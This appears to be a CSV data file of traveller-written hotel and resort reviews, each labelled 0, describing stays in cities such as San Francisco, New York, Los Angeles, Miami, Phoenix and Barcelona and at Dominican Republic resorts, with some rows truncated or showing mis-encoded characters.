"only ok this hotel was the last leg of our honeymoon...we had been in vegas, monterey and los angeles and stayed in great hotels in each so we were confident that the stanford court would be great too. but we were wrong. i was not crazy about the location...though it is close to china town it is not close to anything else. the room they gave us first was a queen (after we had asked for a king) and was tiny and faced the dumpster on the street. because there is no ac we slept with the windows open. the crazy loud noise from the construction going on outside at 7 am woke us up. i looked out the window and there were literally people working 6 feet away from me. it seemed to me to be mindblowing that theyd give people a room directly next to a dumpster/garbage facility. thankfully, because we had asked for a king they switched our room that afternoon and our next room was somewhat larger and faced the courtyard. it was definitely outdated in decor and the bathroom was the size of a shoebox but that is par for the course, i guess, in big cities. another annoying thing about the hotel is that they charge $40 a night to park your car. i am from nyc so i know how crazy parking prices can be, but $40 is exorbitant. so stay somewhere else, somewhere closer to the water and the action.",0

"disappointed by the beg bug we chose this hotel because it was close to universal studios,it was the cheapest in the area and it provided free shuttle service to universal studios. the staff was nice and friendly. no problem with the sevice at all. the food was good little pricey but okay. the rooms appeared to be clean. the first morning i got up went to my aunt's room . she and her granddaughter were still in bed. i noticed a red stain on the sheet of the bed the 9 year old was sleeping in. i approached the bed and then observed little bugs. i smashed the bug with a piece of paper and it stained the sheet, looked like a blood stain. would you know it bed bugs. we called immediately to the front desk, we were told the manager was not on site. they sent up the engineer he checked behind the headboard with a flashlight. an hour later someone else came to the room and he tried to tell us that these bugs came in sliding door because it was open and that they were not bed bugs. not knowing that we had caught them in a plastic bag and showed him the evidence that these were in fact bed bugs. he finally agreed to not charge us for that night. moved them to another room. after that our stay was good.",0

"convenient location reviews of this hotel seem somewhat mixed but we were very pleased with it. we arrived at 7.30.pm after a transatlantic flight but without our luggage which decided to spend an extra day at heathrow. the lady on check in was very kind and gave us a large bag of toiletries saying we could keep any we didn't use. check in was quick and efficient and my requst for a higher floor room overlooking bayside was provided. we stayed here 4 nights prior to a cruise and whilst miami isn't really a city break destination this is very good for that purpose being opposite the shops and restaurants of bayside and a very short stroll around the corner to the metromover which takes you for free all around miami including about 4 stops away right to macys door literally! we didn't eat at the hotel other than breakfast which was fine. the service, cleanliness, comfort of the beds and condition of the hotel were good also. we hired a car and parked in the secure staffed area to the rear (which has direct access to the hotel via the swimming pool area). overall, whilst not having any gimmicks or flash facilities this proved to be a pleasant and relaxing start to our holiday and as such is recommended for someone wishing to be in the downtown area - though not, of course, near miami beach.",0

"perfect for a short break on a budget like many others who have contributed reviews, i can highly recommend the chelsea lodge.i was staying in nyc on my own for a few days and found it very difficult to find somewhere that was not too expensive but was clean, warm and comfortable.i eventually settled on the chelsea lodge and it absolutely ticked all those boxes for me. it is close to all the attractions in the city such as the empire state building, times square etc and has two subway stops nearby to get you everywhere else. however, despite its closeness to all these things, the neighbourhood is very quiet and, indeed, very pleasant with tree-lined streets and lots of nice diners.the rooms in the hotel are fairly compact and pretty old-fashioned but very clean. each room has a wash-basin and shower and a tv. the rooms are cleaned every day and towels and bed linen replaced.sure, there's a shared wc, but on my floor there were two of them and one right beside my room, so that was great.i suppose the only downside is that parts of 8th avenue can be a little seedy and the chelsea area would appear to be the gay district of nyc, is that is something you are uncomfortable with. it isn't something i was used too but by no means was it off-putting.i have no hesitation in recommending this place. very homely, very cosy and very reasonable. go for it!",0

"absolutely fantastic resort ! my husband and i stayed at the legacy resort for 7 days beginning october 15th. this was a beautiful resort with great landscaping, fantastic views, and incredibly good food in their restaurant. we stayed at a time when they were reseeding the golf course, so it was a pleasure not to be crowded with golfers. the view of south mountain in the evening was beautiful and romantic. we had a 2 bedroom condo combination and it was larger than my home, with beautiful red marble bathrooms and top-notch furniture and kitchen appliances. we've stayed in a number of gold crown timeshares and this place was the absolute best. i can't say enough good things about this place and would not hesitate to go again.",0

convienient comfortable business travel hotel this was my third stay in two months and i have noticed a continuing trend of upgrades and service. understand the property is under new management and it really shows. prices are competitive especially against the downtown megaprops who charge you for standing still in one spot too long. nice little bar and restaurant on site and easy walking distance to trendy bistros (portland's a really nice hip restaurant is immediately next door.) recommend this highly for the seasoned pheonix road warrior or warriorette.,0

"a little overused we were staying at the sportsman's lodge for a dinner event - and we sure weren't the only ones! there were at least three weddings as well as a film shoot. and, in addition, there is a huge remodeling effort. so it was noisy (we were lucky to be on the end of the hotel away from the noise), crowded, and the staff was a little frantic. our impression is that the hotel is a bit overused and perhaps getting shabby because of it. having said all that, it is in a great location, jerry's deli has some of the best food in town, and we always feel safe when walking on ventura blvd. so we will probably stay there again.",0

"regular rooms are ok, but avoid the ""superior"" rooms hotel axel bills itself as a hetero-friendly hotel. indeed, i was in barcelona for a conference and there were many hetero's there who had no idea it was really a gay hotel -- that is until they got to their room and found the large artwork of a naked guy on the wall. quite amusing actually. nonetheless, the staff treated them well, as far as i could tell.still, the hotel is definitely designed for a the gay traveler on holiday. it is not set up for business travelers, but provides a comfortable bed in a convenient part of town. (wifi was relatively inexpensive though -- 6 euros for 24 hours. and they had to pcs available for checking email, etc., for free.)on the positive side: the location, the very comfortable beds, the free bottles of water, and of course the gay-friendly atmosphere. the restaurant served good food at a fairly reasonable price, and room service was generally good, for someone ordering in english and not catalan or spanish. the breakfast buffet was bigger than expected. during my february visits, the roof deck amenities (pool, jacuzzi, gym, etc.) were too cold to enjoy, but looked like a great place to hang out in warm weather.on the negative side, the rooms were very spartan and on the small side. the double, city-view room had a nice balcony, but otherwise was small and lacking in storage and surfaces on which to put things. the wire-rack storage system (shown in room photos on the web site) is clearly a cost-saving measure and lacking in functionality. there were few surfaces on which to put things, such as a glass of water, a wallet, coins, etc. also on the negative side, they say the rooms are sound proof, and indeed the windows are effective at blocking street noise. however, every small sound from the corridor seems to be amplified by the hallway and is loudly transmitted through the door to the room.we stayed one night a second time a week later in a superior room, which had a beautiful stained glass-enclosed balcony. lovely to look at, but not well integrated into the room. in fact, the entire superior room was poorly laid out and had a poorly designed bathroom. (very poor feng shui!) all my bathroom pet peeves were there: 1) no door on the shower or bathroom, meaning steam permeated the entire room; 2) glass wall between the shower and bedroom (sexy when i was younger, but annoying now); and 3) no ventilation. all in all the superior room was not worth the extra money over the city-view double.other details: tv had only two english language channels. the pay-per-view selection was limited and extremely",0

"wharf on one side, ghetto on other on one side of the hotel was fisherman's wharf just a few blocks away. on the other was a kind of seedy area with lots of bums. the neighborhood the hotel is in wasn't the best. we always kept it in our heads that we should get back to the room before it got too late. there were some problems with people at the front desk, one younger guy (can't recall his name) was uncooperative and unprofessional. our airconditioner wasn't in the best working order. we had a nice size room with 2 double beds. my parents' room with only one king bed was really small they wanted to change, but the hotel was booked up. breakfast isn't included in the room rate, although there is a restaurant adjoined to the hotel with decent, average-priced food. i think it was around $10.00 for an omelette. we expected a better hotel and even thought this is it but it was reasonably princed. there are so many sf hotels, we should have taken more time to find a nicer place. it wasn't necessarily bad, just not any thing great, either.",0

"convenient in staying pre-post cruise we booked this hotel by calling holiday inn because their website was not allowing us to book. to our surprise when we arrived at the hotel, they had booked 2 rooms instead of one and since the rate was non-refundable they didn't want to reimburse the second room. after waiting 15 minutes while the staff member spoke with the manager, they did credit our account...however they did not apologize and made it seem like it was our fault and they were doing us a favour. otherwise the hotel is very convenient if you wish to stay a day pre or post a cruise. bayside marketplace is across the street...shopping, restaurants, entertainment and boat tours are found there. we were told by locals to stay at bayside and not go to downtown miami after 6pm as it is dangerous. the taxi to the port is a flat rate of $10. the taxi from the airport around $35.the rooms were clean, beds comfortable, bathrooms brand new. but walls were paper thin and everything could be heard from our neighbours.",0

"extremely enjoyable visit my husband and i have just returned from los angeles (on our way back from hawaii) and stayed for 2 nights at the roosevelt hotel. having (rather stupidly i now think) read the reviews before we went, we were a little worried i have to say. however, all our fears were unfounded and we found the roosevelt to be a visit of pure luxury. we had a wonderful room, the decor of the entire hotel we loved and every single member of staff we came into contact with spoke perfect english and were extremely helpful. in fact we didn't recognise the hotel from the description in some of the reviews we had read! we couldn't fault it - it met our every need.they did have some events going on whilst we were there. some we weren't even aware of and the one we were aware of in no way spoilt our visit and the staff certainly didn't make us second class guests because of it. after all, i imagine most businesses have to diversify to make a profit these days and the fact that they are a popular venue for events surely means their customer care and professionalism is good!we would make a point of staying there again.",0

"great property. could use some improvements. my wife and i stayed four nights here in late june. prior to our stay, we stayed at the disneyland grand californian property for three days. the biltmore does not compare to the grand californian but it's also not as expensive. like everybody has already said, the lobby and public spaces are gorgeous (my wife found everything a bit creepy however, as the old black and white photos and the hallways and corridors reminded her too much of the shining -- she was half-expecting that i would be possessed by evil spirits when i returned to our room from getting some ice!) but the rooms are less than modern. parking is also a hassle. so, all in all, here is my summary of the biltmore:disadvantages:- lots of street noise (bring earplugs!)- old old tv (c'mon, i understand the biltmore is limited in some respect by the architecture of the building but certainly better and newer tvs cannot possibly be beyond their budget! many luxury hotels -- including the disney grand californian -- have already switched over to widescreen lcds)- no mini-fridge. really, how many luxury hotels can you think of that do not have fridges. come on, biltmore folks, they are not that expensive!- the valet parking is a hassle. expensive ($40 per day) and also time-consuming if you need your car often. i also stopped tipping the valet after the first few times because i realized to tip a fiver everytime you need your car was going to get way too expensive. like other reviewers have mentioned, there is parking across the street at pershing square but there are no in and out privileges and you have to be out of the parking lot before 9 am or they will charge you more than the overnight flat rate. there are also some shady-looking characters hanging around that square late at night so pershing square is not a very good option if you need your car at all times of the day.advantages:- gorgeous property.- within a short walk of some wonderful la landmarks -- disney concert hall, angels flight, the bradbury and grand central market. the grand central market is a great great place to get lunch. plenty of wonderful food and unbelievably cheap. best bang for the buck, in my opinion, of all the places we dined during our stay in la/anaheim.- clean, spacious rooms. my wife loved the king-size bed in our room. very comfy mattresses and comforters.- friendly and helpful staff. the valets continued to be very polite and courteous even after i stopped tipping.",0

"great place! the best western hospitality house is a friendly, casual hotel. our room had a fold out sofa bed, and 2 bedrooms. the rooms themselves let in hardly any light in the morning and late afternoon, so we always had a light on in the sitting room.the beds are quite comfy. the decor is very old fashioned. the staff are friendly and helpful. its in a fantastic location, just down the road at the waldorf astoria there is a hop on hop off bus tour, which brings you around downtown nyc. its a loop, so it starts at times square, ends at times square. there are 2 gorgeous italian restaurants on either side of the entrance. caffe linda, and san martin (san martin is the best marginally). there are supermarkets nearby, and plenty of shops.the safe in the room is a bit tricky to use at first, but its easy enough to get the hang of it. you get free muffins, danish pastries, bread, cereal coffee and tea in the rooms. you also get a small-ish carton of fruit juice. the fridge is very reasonably sized. one thing is the air conditioning is very old and noisy, and it may keep you up at night if you have it on. overall this hotel is great!",0

yuck......don't do it you think hyatt you think quality......not this time. the pool was so filthy that even the mgr sasha apologized for it. we were in phoenix az durring august on a long weekend and were unable to use the pool because of its condition. now thats bad....but not as bad as when we tried to sleep that night in our bed. hard as a hardwood floor but even that wasn't as bad as the sheets...something out of a no-name motel....they scratched you like they were made of sand paper. we spoke to the mgr about all of this and to his credit he apologized and said the monies were not allowed at this time to up-grade the property....which really had not been looked after at all. we were supposed to stay thru sun nite after arriving thurs afternoon....we left friday morning as fast as we could.,0

"pcp paradise vacation just returned back from our first vacation in dr on monday. my daughter (18 yrs. old) and i had a great time. we were a bit concerned with weather, sickness and hurracaine issues but turned out had absolutely nothing to worry about.flight by skyservice went very smooth. only complaint was how cold the plane was and lack of blankets. arrived at pc airport and was quickly transported by sunquest bus to resort.check in at resort went quickly. offered us cold drinks while we waited in line. front desk greeter was very friendly and met us with a big smile and a bit of personal chit chat. room was not ready but only a 45 minute wait. gave us a chance to grab a cold drink at the lobby bar and walk around for our first look at the resort. bags were brought right to room by bellboy when ready. room was exceptionally clean and cool as ac was already running. room had two double beds, ceiling fan, sunken living room with sofa bed, television, bar fridge that was stocked daily by maid with beer, coke,sprite and bottled water. had our swimsuits on and were in the pool within minutes of getting our luggage.the pcp is so quiet and private. never a problem to get a lounge chair at the pool or beach. no lineups at the bar. a la carte could be booked every night if you wanted. food at a la carte restaurants was great. especially enjoyed the fillet mignon at the steakhouse and the calzone at the italian. booked four nights of restaurants, ate buffet 1 night and enjoyed dinner on the beach at the saturday night beach party. always lots to eat and plenty of selection. neither my daughter or i suffered any sickness. we did make sure our tetnus shots were up-to-",0

"ok rooms, below average service being in the hospitality business, you see a lot. there are some things that are not within a hotel's control, such as a city's temporary shut-off of water, etc. service, however is paramount, and as a supervisor of mine always puts it, a room is a room, is a room. guests want great service. at check in for a weekend we weren't really greeted but checked into our room. we made it to the happy hour and requested a gin and tonic, but they were out of tonic water. a vodka and orange juice? no orange juice. my friend joked,ok what can we have? the response was,well you're a little late for cocktail hour, so you're lucky you're getting anything. i looked at his face for some sign of jest, but he was serious.the next night after requesting a ride on their complementary shuttle for a night out on the town, we were turned down because it was considered outside of their service zone. the clerk at the desk scoffed while letting us know, but called a cab for us. rooms here are comfortable, and reflect an updated holiday inn look. beds are very comfy. being so close to the airport, this establishment is probably very used to accomodating business travelers and older patrons. maybe the service we received was due to our age (late 20s). nonetheless, i was not impressed, but i am glad that others have had positive experiences here. i won't be going back.",0

"great customer service!! we stayed at the caravaggio two weeks ago and loved it. i had requested a room towards the back instead of facing the street so it would be a little quieter. one was waiting for us when we checked in, exactly how i requested. it was very peaceful and i spent several hours just looking out of the window each day. we had wonderful weather so the breeze was nice. if you stuck your head out of the window you could see the duomo! we were right over the little enclosed patio area in the back. it was small, but very pretty with wrought-iron benches and tables. our last afternoon we spent chatting with a fellow american and enjoying gelato out on the patio.the sitting areas were very clean and nice. there was internet access on the computer there for 1e per 15min. they had a bar for drinks near reception but we didné¥?? use it. the breakfast was wonderful and the staff kept it well stocked. we found all of the front desk staff to be exceptional. they not only accommo",0

"stayed here a while ago... was a little bit disapointed i haven't stayed here in a while, but i did a couple years ago and was sort of disappointed. the hotel itself has an incredible history (with the academy awards having been here for many years) and its fun to just drop by the hotel lobby and walk around or get a cocktail at the lobby bar and soak up the atmosphere. but when i stayed here one night, i was given a room out by the pool. the room was not very clean and the pool area was noisy (partiers walking out there late into the night). it is a beautiful hotel on the exterior, but i was underwhelmed by this bare bones hotel room. the sheets were itchy. don't know why. didn't sleep well. i expected a romantic, old fashioned hollywood inn that had that 30s-40s retro feel with very clean rooms. instead it was more of the kind of party room you would get in palm springs near the pool area of a small to midsize hotel during spring break. i'm sure the hotel probably has other rooms that are more what i was thinking of. but i was slightly disappointed anyway. the hotel restaurant has ugly decor that looks like something someone's grandmother picked out. not retro and not period style, like it should have. food was over-priced and mediocre. they need to develop the lobby bar area into a more user-friendly part of the hotel. it's too small. they should spritz up the outside of the hotel with fresh paint and some cool old-style awnings. class it up a bit. and retro-fy the rooms back to the old style.",0

"nice resort/bargain price we recently spent a week following christmas at the pointe hilton squaw peak resort. we found this resort to be an excellent choice for a visit to the phoenix area. it is located close to several major streets and freeways, making local travel easy.although the resort was full of families taking advantage of the pool area, we found several, small, quiet pool areas to relax away from the activity. the weather was unseasonably cool, so we did not take advantage of the lazy river, but it looked quite clean and well-maintained.our room was not a suite, but a second floor king bed room that was very nicely redecorated and spacious. it did not have a mini fridge, although.overall, the resort grounds were beautiful and the staff was cordial and helpful. we did not dine in any resort restaurants.our resort stay was very low cost, we felt, as we travel often and choose high-end resorts and hotels. our total experience at this hotel was positive and we would return to this location.",0

"Great resort except for the restaurants My wife and I stayed sept. 2 thru 9. We are in our mid 20's and 30's. I don't speak Spanish and my wife knows just a little. We've been to the caribbean on a cruise and visited several islands, and stayed at an all inclusive in the riviera maya. I read most of the reviews good and bad and thank you for those. I always keep an open mind but also like to be prepared.Arrived at punta cana airport and purchased the $10 dollar cards, fast thru customs, avoided the bag grabbers that want a couple bucks for carrying your luggage 15 feet and went right to one of the tourist companies set up there. I had only bought airfare and hotel, so i needed a taxi or a transfer to hotel. There seems to be a set fee of $30 dollars per couple for a one way transfer in air conditioned mini bus. So if you need a tranfer to a hotel, after customs, just go right to one of the tour companies there, I happened to go to funjet vacations. Bus ride was wild and fun, similar to driving in Italy but with pot holes and speed bumps. Arrived at hotel after 40 minute ride, no wait at desk, guy spoke decent english, got a couple drinks and right to room. Here's where I noticed a problem right away but still kept an open mind. I had asked for a top floor room but got a second story room. From other reviewers as well from past experience, noise from above can be a problem, plus tile floors echo sound. Now for all those that seem to complain about every little detail to the front desk and try to get a better room, well i thought about it. The reviewers who did, seem to do better later. I decided not to complain, i saw positives - the room was on the end of building, so only 3, not 4 neighbors and it was in the middle of the resort convenient to everything. Fortunetly neighbors above were fairly quiet. But when furniture is moved, sounds like someone is vacuuming in your room, very loud.ok, for the room, exactly as expected, very large, jetted tub in middle of room with two sink bathroom, small toilet area and very large shower. no problem with water pressure. bed was comfortable for me and my wife. pillows are long and thin. i rolled my second one up for double support. tv has variety of channels for when you get food poisoning and can't concentrate to read. mini bar always stocked every day. maid came 4 days at 3 pm and 3 days at 10 am. no problem with service and always pleased. she even sprayed air freshener three days because in afternoon, we did get a musty smell from a/c. It smelled like heavy smoke and i tended to turn the a/c off in the afternoon or make sure i wasn't in the room then. smell sometimes came thru mid morning and late at night. Don't know if they have a problem with ventilation system as it may be smokers in some rooms sharing smoke with non smokers in other rooms. I never noticed the smoke when it was time to eat. why would i be in the room when its time to eat - food poisoning.restaurants: breakfast selection is excellent, lunch selection is good. Buffet dinner was best dinner meal we had besides gourmet. Steak restaurant had same food as buffet. caribbean restaurant was bad except their buffet selection was ok. The beef and chicken we got in our burritos and fajita's was tough and inedible. We took a couple bites and left. The following day, I was stuck in my room for 2 days with no appetite and very weak. Luckily i didn't throw up but did get diarreha (however its spelled) after i got my strength back and was able to eat again. Both my wife and i still have it but its finally getting better now that we are back in states. So she ate at buffet when i did not eat. We missed the fish and oriental restaurant. We did manage to eat at the gourmet the last night there and that was very nice. We both had chicken soup, filet mignon and chocolate cake. All very good. Gourmet was only one we would recommend though you are only allowed one visit a week. You can be carefull all you want when eating but you never know when the food will get you sick. My wife and I watched carefully what we chose, ate a yogurt a day, and yet we both got sick. We did see other people actually throw up at the restaurants but that was rare. Not much you can do but get better and enjoy the time you still have. We never got sick in the Riviera Maya. the resort: fantastic!!! pool is long and has activities most of the time or has its quiet places. bars all over the place. try the cooc loco or the majestic drinks. beach is very nice though swimming area is not that far into water. you do have to be carefull of rocks. plenty of chairs. kayaks and windsurfing. no pedal boats though which was disapointing.

great for the location and serviceé¥?4/5 ok so i went in feb 2005 and am only just posing a review. main reason been i was unsure as to whether i enjoyed the hotel for what it was or enjoyed the hotel because i was simply in new york.we arrived at about 10:30pm local time after a long flight from london. we were greeted at our cab outside the hotel by a friendly gentleman who took our bags and put them on a trolley. i was only 20 at the time and i took my 18 year old girlfriend so upon check in i had to provide a credit card. (i used a photocopy version). we were then taken to about the 22nd floor and shown a room which i was impressed with but had two single beds. i ask for a king and without hesitation was taken to the 33rd floor and sure enough a king size bed with an amazing view. (looking out eastwards i think.) unpacked and went straight downstairs where the same door man (a guy with a mustache and of asian origin i think) called us a cab to time square.the next day i wanted to check the reservation i made at the river cafè was still ok. but me being me i had booked the wrong,0

"below your lowest standards stayed 3-nights in this place when attending a conference in downtown phx. absolutely dreadful, do not stay here unless you have no other options. poor room conditions and bathroom was not passable in any respect. the hotel must have been an older 1960's apartment building or something, 2-stories walk-up outside entry. neighborhood was very sketchy. the unit i had turned out to be a 2 room with a small kitchen. furniture looked like it came from the salvation army because it was not up to their standards. at over $90 per night, this was a very bad experience, and i do not advise you to stay here under any circumstances.",0

"worthy of an emperor or empress i recently stayed at the palomar and it was a really great experience. from the the moment i arrived everyone was so helpful and friendly. and the inside is really smart and cool. . no really, inside its modern, sophisticated, and definitely feel as if i am in los angeles. it has that cool, yet upscale look. i would say its trendy but not annoying or too cool for school like some other la boutique hotels. it has a complimentary, yes complimentary wine hour everyday from 5-6!!! i'm not a lush but who doesn't love free drinks. im seriosly excited about this place and i joined their points program because i wanna stay here again and see their other hotels. they have a really cool one opening in miami. im actually at work right now writing this review because i want to come back! they have free wi-fi, which for business i really need. its right in one of the nicest neigborhoods in la, right next to beverly hills, bel-air. westwood and really close to santa monica. the bed was extremely comfortable, i was basically sleeping on a cloud in heaven. their restaurant is really delcious also. but mostly what makes the huge difference is the service. everyone is so eager to help and make you feel really comfortable and at home. like i said, this is fit for and emperor, or empress, a really hip and cool emperor or empress",0

"love the best western hospitality house in nyc we just got back from a week stay in nyc. two couples with us stayed in the penthouse at the hospitality house and my daughter, husband and i stayed in the one bedroom suite with pull out sofa. the place was fantastic!!! everything was clean and fresh and the rooms are huge!! we had everything we would need in the kitchen and they kept it well stocked each day. the water is very hot and powerful every time we used it. the staff is wonderful and will do anything they can to help you. maid service was great every day. we will stay there again when we go back to nyc and i would tell anyone that this is the place to stay. i have read reviews discussing the street noise well remember you are in nyc midtown and this is all part of the nyc charm. location was super and could walk to alot of tour sites. you can catch a taxi right in front of the hotel and the metro line is not far away. the staff will store your luggage if you check in early or if you check out but still have time to tour before you leave the city. cafe linda next door is a great place to eat. well, done hospitality house in nyc!!!!",0
"perfect for the price! perfectly located, within walking distance to the empire state, macys etc... but if walking is not your thing its a block or two away from the nearest subway. the hotel very quirky, homely, friendly and the rooms are comfortable and warm (ideal for -minus temps) theres a great little diner not far away called the empire which makes a cracking breakfast that will keep you going most of the day. there's a lovely selection of restaurants close by (at the end of the street) if your feet are killing you after all that shopping. would recommend it to anyone and i would certainly stay there again. we had a problem with a noisy neighbour one night turning the tv full blast and occasionaly screaming at each other until 2am, we spoke to the duty manager and he was very helpful and sorted it, thankfully they left the next day!! we used a taxi to get there from jfk airport but because our flight was early leaving and we needed transport at 5am, we booked a car with dial 7, it was the around $50 and it arrived on time and took us direct to the airport, brilliant!",0

"Beware!!!! We read the poor reviews and thought to take them with a grain of salt and go to have a good time. We went to Breezes to celebrate our 5th anniversary and in a word it was a disaster! We were there April 24 - May 1. I know what happened to me is rare, but on the Wednesday of our trip I started feeling sick, so I spend the afternoon in our room, as the day went on I developed a high fever, diarrhea and then bleeding with the diarrhea, so I had to visit the resort's doctor. I was rushed to the hospital by ambluance and ended up staying there for two nights. VERY TERRIFYING!!!The rest of our vacation was a right off, as I still had to be close to a washrroom and even now that I have returned I am still recovering and under doctors care. The doctor in the DR and my own doctor informed me that I had a bacterial infection and a parasite, that was contacted by food that was not prepared properly by someone who did not was their hands propberly!!! That is disgusting! So there are obvious health and cleanliness issues that the resort needs to address, and here are my other observations: ROOMS: Our room #4119, was terrible, mustly smelling, paint pealing of the walls, bathroom ceiling cracks and tiles craking. We were told that the resort was filled to capacity, and nothing else was available. Maid service, is surface cleaining only. For the whole week we had dead roaches in the corner and behind the drapes, never swept up or cleaned. Never enough towels or toilet paper! FOOD: The food at the gourmet restaurants are great - if you can get in that is. We went down already to eat at the first setting 6pm, and sometimes even then we were turned away and told the restuarant was full for the evening, and when you looked in, the restaurant only half full! If the resort is full to capacity the restaurants should also be running to accomo",0

"parking and vibe hotels we stayed at the vibehotel on goulburn st after booking a mystery hotel on lastminute.com.au. it is rated as a 4 star hotel. after reading some rather negative reviews on tripadvisor after booking, i wondered how our experience would be. i agree with those that commented that it's not a 4 star hotel, mainly because of terrible tv reception, old style tv and such a loud fan for the airconditioning we had to turn it off to sleep. the hairdryer didn't have any hot air! the issue that prompted me to write this review was the difficulty with the carpark arrangement. the parking station is across the street from the hotel. the lift doesn't work, so we had to walk down several flights of stairs with our suitcases. next morning at checkout the front desk assured us twice that even though the carpark ticket issued by them had the wrong",0

"#1 in la?? overall we had an enjoyable, problem-free stay at the omni la. i just find it hard to believe that this is the top-rated hotel in all of los angeles. la hotels must really be in sad shape.the hotel staff was very friendly so i will give them props for that. the room was clean but just average overall (beds were nice but unfortunately my back didn't agree). the bathroom was large but had no counterspace and the shower water pressure was pitiful. for a hotel that welcomes kids (toy packs, cookies), their tv service did not have either disney or nickelodeon. room service was tasty but quite expensive. no vending machines so you're forced to order drinks from room service. valet service was slow, even slower when we called ahead. biggest frustration was that we were in town for the lakers game and hoped to have the car service take us to staples center. when we asked the valet to arrange it he told us that they didn't go to staples center. huh? it's a mile away! he didn't even provide an explanation or offer to at least take us somewhere closer to the arena.overall the omni was a nice place to stay, just not what i would expect from the #1 hotel in the 2nd largest city in the country.",0

"Saturday's Are ""Different"" Just came back from this resort after staying 4 nights for a wedding. The overall experience was fantastic, BUT, alot of that is due to being there with a large group of fun and interesting people who were all connected through the wedding party. There was only one real negative that I saw so I will report on that first and then give my take on the rest of it:I was there from Wednesday to Sunday, and from Wednesday to Saturday afternoon, the resort was made up of primarily American, European and Canadian tourists. On Saturday, I observed several bus loads of local tourists arrive in the lobby. Some said that the resort heavily discounts weekend rates for locals. Not sure what the story is, but the population at the pool and pool bars was different and much more crowded on Saturday. The nightclub which played great American music the prior three nights, switched to accomo",0

"4 star amenities/ 3 star service my wife and i stayed at the westin century plaza from march 1-3. i actually used my starwood points for this trip, and got a nice room overlooking 2 giant office buildings that were under construction. to comment on the parking situation based on previous reviews, i had no problems with the self-parking lot. you do have to go right past the hotel and make a right onto st. regis ave to get to the garage, and walk across a pedestrian bridge from the garage back to the hotel. but i'd rather pay $20/day, than $25/day + tip for valet and be able to get my car whenever i want.we checked in and were given a room on the 17th floor right next to the elevators. the room was very clean and updated and was truly a 4-star quality room. the beds were very comfy and the shower is highly enjoyable.we arrived late in the evening and had already eaten dinner, but my wife wanted desert so we ordered room service. i was put on hold and had to wait for the next available room service agent which actually took close to 10 minutes, something i've never experienced before. i ordered a bowl of berries normally on the breakfast menu. 2 minutes later, my wife wanted me to add a glass of milk to the order. i called back and they told me that would be fine. however, when the order arrived, there was no milk. my wife decided to forget about it.we chose the hotel #1 because i could get it free with my starwood points and #2 because we were going to a taping of the price is right and also wanted to tour hollywood. the hotel is a is in a good location to all of these things as we got lost trying to find cbs television city at 5:30 am, but still managed to get there in time. the restaurant, breeze, is excellent. they are supposedly known for their sushi, which i had. it was very good, but i've had better. i live in san diego where i have my pick of about 50 sushi restaurants within a 10 mile radius, so i know sushi. the prices are typical la prices if not a little on the cheaper side if possible. my wife ordered filet mignon which came with a nice portion of mashed potatoes and spinach which cost $32.all in all, i found the hotel to be enjoyable and in a decent location if you are planning on visiting hollywood and/or beverly hills.",0

"we liked this hotel! we stayed recently (apr 6-9) and i was so freaked out about arriving to this hotel and finding some awful place, but was so relieved to turn the corner and find a nice, shady, high-rise hotel with several buildings (several hotel building pods, i guess you might say). we went after most spring breaks were over. no crowd in the lobby or at desk. we were checked in promptly, and our request for a quiet room away from any freeway noise was given no problem. we stayed in the portola building, 6th floor. elevator was easily accessible on both ends of the building. the room was large, nicely decorated (yes, not modern, but cozy). the balcony was nice to have, with chairs and a table. no screens, but that wasn't a problem. the room was very clean, inside and out. three pillows to each bed. nice easy chair, lamp and side-table by the balcony for sitting and reading. nice desk - wonderful lighting. clean bathroom. small coffee bar area (unfortunately, no mini-fridge); outdoor sink and mirror as well as inside the bathroom so you don't have to wait to do hair/makeup. nice pool area - heated pool - i was excited to see what i thought was a jacuzzi hot tub, but it was a small wading pool. they need a hot tub... the shuttle is busy, but if it is full, he takes them and comes right back for you. you don't have to wait another hour. frankly, we walked home one night. it isn't that far if you like to walk. this is also just in walking distance to a very nice market complex - ralphs, with jamba juice, starbucks, places to eat, etc. i think the folks who wrote not nice things are clean freaks, people who expected a four star hotel (the hilton is up the hill). this place is just fine. everyone was nice. i would encourage the hotel to put in mini-fridges, and turn that wading pool into a jacuzzi.",0

"Beautiful Grounds, Friendly Staff We found the Ocean Blue resort to be a good value. The grounds are meticulously clean and beautifully landscaped. The rooms are a bit worn and in need of updating, but who stays in the room anyway? When we arrived at our rooms, we found that one room had no light bulbs, two rooms had safes that did not lock, and another room had water dripping into the tub from the overhead light fixture and the telephone did not work. We called the registration desk about all of these issues, and they were resolved the following morning by courteous staff. The morning, lunch and evening buffets were all good, especially the grilled lobster tail on Christmas Eve. We found the Italian restaurant to be quite good and ate there twice, with salmon grilled to perfection. We spent most evenings in the lobby bar area, which had a wonderful breeze 24/7. The evening entertainment in the lobby was good, although we did tire of the Caribbean music day after day. We were treated to some rock 'n roll music on Christmas Eve and had a blast with (almost) everyone in the bar dancing into the night. I read a review about the excursions being horrible. We enjoyed the two excursions we booked and felt that the price was well worth it. We went on the Sanoa Island excursion and LOVED it. The speed boat ride there was cramped but our guide was a hoot and made the trip fun. The Sanoa Iisland beach is beautiful. Lunch was served just off the beach, and I was glad to see that it was served in a sanitary manner (with no flies!). All members in our group thought the BBQ and side dishes were quite good. The catamaran sail back to the mainland was great fun with music, dancing, beautiful water and beautiful scenery. I don't know how anyone could not like this excursion. We also booked the zip line excursion. This is a brand new facility in the mountains that is nicely landscaped. The zip line staff was friendly, thorough, and SAFE. Be aware that one must climb up quite a few stairs to the platforms to access the zip lines. If you can't do stairs, this is not for you. The platforms are very sturdy and well built. This was good, clean fun. I don't recall what the minimum age/size requirement is for children, but I'm sure there is one. The ride to get to the zip line facility is a tour in and of itself. You are in an open air vehicle and are able to view the interesting plant life/flowers/cocoa trees, etc. as the vehicle slowly climbs its way up the mountain to the zip line facility. I believe the Safari Tour takes at least part of this route, so be aware of this if you are planning on doing both the safari tour and the zip line as you may be seeing a lot of the same thing. If you are interested in a deep sea fishing excursion, you will probably want to check into this soon after your arrival. We waited until Wednesday before inquiring about this excursion and there was no availability. We usually prefer sitting at the beach, but one or two days it was so windy at the beach that we retreated to the pool. The pools are large and clean.

